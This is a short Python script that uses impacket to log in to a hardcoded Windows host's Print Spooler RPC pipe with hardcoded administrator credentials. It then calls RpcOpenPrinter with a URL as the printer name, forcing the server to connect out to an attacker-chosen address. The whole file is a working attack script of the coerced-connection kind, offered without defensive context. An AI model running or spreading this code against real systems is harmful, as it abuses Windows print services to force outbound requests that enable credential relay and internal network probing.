# -*- coding:utf-8 -*-
"""
@Author: ThesYu
@File: WinRpc
@Time: 2022/3/5 18:25
@Desc: Everything is possible.
"""

from impacket.dcerpc.v5 import rprn
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport

TS = ('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0')
IFACE_UUID = rprn.MSRPC_UUID_RPRN

if __name__ == '__main__':
    username = 'administrator' # 用户名
    password = 'admin123'     # 密码
    domain = ''
    lmhash = ''
    nthash = ''
    rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:192.168.124.14[\pipe\spoolss]')
    rpctransport.set_credentials(username, password, domain, lmhash, nthash)
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(IFACE_UUID, transfer_syntax=TS)
    request = rprn.RpcOpenPrinter()
    target_url = r"http://www.baidu.com/"
    request['pPrinterName'] = '%s\x00' % target_url
    request['pDatatype'] = NULL
    request['pDevModeContainer']['pDevMode'] = NULL
    request['AccessRequired'] = rprn.SERVER_READ
    dce.request(request)
    if rpctransport:
        rpctransport.disconnect()